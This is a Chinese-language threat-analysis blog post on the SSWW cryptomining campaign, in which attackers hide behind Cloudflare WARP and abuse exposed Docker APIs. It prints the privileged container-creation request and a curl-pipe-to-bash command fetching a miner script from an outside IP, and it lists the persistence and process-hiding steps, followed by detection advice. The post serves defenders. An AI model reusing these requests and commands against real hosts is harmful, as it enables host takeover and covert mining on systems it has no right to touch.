---
title: "穿云破雾：SSWW 挖矿活动分析"
date: 2025-03-24
tags:
  - 应急响应
  - Docker
categories:
  - 云
---

利用可信云基础设施与服务进行防御规避。

<!--more-->

SSWW 挖矿活动中，攻击者利用 Cloudflare WARP 服务隐藏自身 IP，并针对开放的 Docker API 端口进行攻击。由于 Cloudflare 相关 IP 被广泛使用，通常会被认为是合法 IP，很容易通过流量安全设备的检测且在回溯日志时被忽略。

## 攻击手法

攻击者首先向 2375 端口发送创建容器请求：

```json
IPv4 TCP (PA) 104.28.247.120:19736 -> redacted:2375 POST /containers/create

HTTP/1.1

Host: redacted:2375

Accept-Encoding: identity

User-Agent: Docker-Client/20.10.17 (linux)

Content-Length: 245

Content-Type: application/json

{"Image": "61395b4c586da2b9b3b7ca903ea6a448e6783dfdd7f768ff2c1a0f3360aaba99", "Entrypoint": ["sleep", "3600"], "User": "root", "HostConfig": {"Binds": ["/:/h"], "NetworkMode": "host", "PidMode": "host", "Privileged": true, "UsernsMode": "host"}}
```

这里使用的镜像 ，通常是受害主机上已经存在的镜像，从而避免了额外拉取镜像。可以看到这里创建的是特权容器，挂载了宿主机根目录并与宿主机共享各 Namespace。
随后，攻击者发送 Docker VND Stream（参考：https://docs.docker.com/reference/api/engine/version/v1.45/#tag/Container/operation/ContainerAttach）以通过 API 形式在容器内执行命令：

```json
{
  "AttachStdout": true,
  "AttachStderr": true,
  "Privileged": true,
  "Cmd": [
    "chroot",
    "/h",
    "bash",
    "-c",
    "curl -k https://85[.]209.153.27:58282/ssww | bash"
  ]
}
```

这里下载执行的 SSWW 脚本的行为如下：

- 停止其他竞对挖矿程序的 systemd 服务
- 如系统已经感染 SSWW 则直接退出
- 关闭 SELinux
- 设置 huge pages 并开启 `drop_caches`（XMRig 优化手段）
- 下载 `https://94[.]131.107.38:58282/sst` 并保存为 `/var/spool/.system`，实际上是一个带配置的 XMRig 挖矿程序
- 下载并编译 `https://94[.]131.107.38:58282/phsd2.c`，如果失败则下载 `https://94[.]131.107.38:58282/li`，生成的二进制保存为 `/usr/lib/libsystemd-shared-165.so`，实际上就是隐藏 `.system` 的 libprocesshider 动态链接库
- 将 `/usr/lib/libsystemd-shared-165.so` 写入 `/etc/ld.so.preload` 劫持动态链接库
- 下载 `https://94[.]131.107.38:58282/aa82822` 并保存为 `/lib/systemd/system/cdngdn.service`，将 `/var/spool/.system` 注册为 systemd 服务并启用

虽然 Cloudflare WARP 可以隐藏攻击者真实 IP，但是记录源 IP 是来自 Cloudflare 克罗地亚萨格勒布的数据中心。由于 Cloudflare WARP 会自动连接到最近的数据中心，可以推测攻击者真实 IP 位于克罗地亚。

## 检测手段

- 主机侧：`/var/spool/.system` 存在强 XMRig 挖矿程序特征，因此云安全中心等 EDR 可以在落盘后检测到（动态链接库劫持、异常 systemd 服务同理）
- 流量侧
  - 创建容器请求：检测针对 Docker API 的请求
  - 执行容器命令请求：检测针对 Docker API 的请求、Content-Type 等
  - 检测短时间内多次公网下载行为

## 参考资料

1. [WARPscan: Cloudflare WARP Abused to Hijack Cloud Services](https://www.darktrace.com/blog/warpscan-cloudflare-warp-abused-to-hijack-cloud-services)
2. [Cloudflare WARP Abused to Hijack Cloud Services, Cado Security Report Reveals](https://securityonline.info/cloudflare-warp-abused-to-hijack-cloud-services-cado-security-report-reveals/)
